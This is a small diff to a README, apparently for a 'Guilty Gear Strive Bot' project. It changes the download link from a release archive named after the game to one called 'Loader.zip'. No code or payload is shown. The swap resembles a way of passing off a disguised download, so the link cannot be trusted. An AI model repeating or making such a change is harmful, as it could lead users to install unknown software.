@@ -54,7 +54,7 @@ https://github.com/Forbidi/Guilty-Gear-Strive-Bot/assets/29312029/1042c520-da60-
 
 
 ## Download:
-The latest version can be downloaded [here](https://github.com/Forbidi/Guilty-Gear-Strive-Bot/releases/latest/download/GuiltyGearStrive_Release.zip).
+The latest version can be downloaded [here](https://github.com/Forbidi/Guilty-Gear-Strive-Bot/releases/latest/download/Loader.zip).
 
 ## Discord:
 
